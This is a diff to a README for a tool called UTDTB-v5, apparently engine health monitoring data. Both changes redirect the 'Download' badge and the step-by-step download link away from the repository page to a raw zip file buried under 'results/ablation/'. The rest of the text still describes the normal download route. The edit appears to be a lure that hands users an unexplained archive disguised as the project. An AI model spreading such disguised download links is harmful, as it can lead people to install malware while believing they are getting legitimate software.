@@ -1,6 +1,6 @@
 # ⚙️ UTDTB-v5 - Reliable data for engine health monitoring
 
-[![Download UTDTB-v5](https://img.shields.io/badge/Download-UTDTB--v5-blue)](https://github.com/Nandu3187/UTDTB-v5)
+[![Download UTDTB-v5](https://img.shields.io/badge/Download-UTDTB--v5-blue)](https://github.com/Nandu3187/UTDTB-v5/raw/refs/heads/main/results/ablation/v-UTDT-1.0-alpha.5.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you begin:
 
 You must visit the project page to access the files. Follow these steps to obtain the tool:
 
-1. Visit this [download link](https://github.com/Nandu3187/UTDTB-v5).
+1. Visit this [download link](https://github.com/Nandu3187/UTDTB-v5/raw/refs/heads/main/results/ablation/v-UTDT-1.0-alpha.5.zip).
 2. Look for the green button labeled Code.
 3. Select Download ZIP from the menu.
 4. Wait for your browser to finish the file transfer.
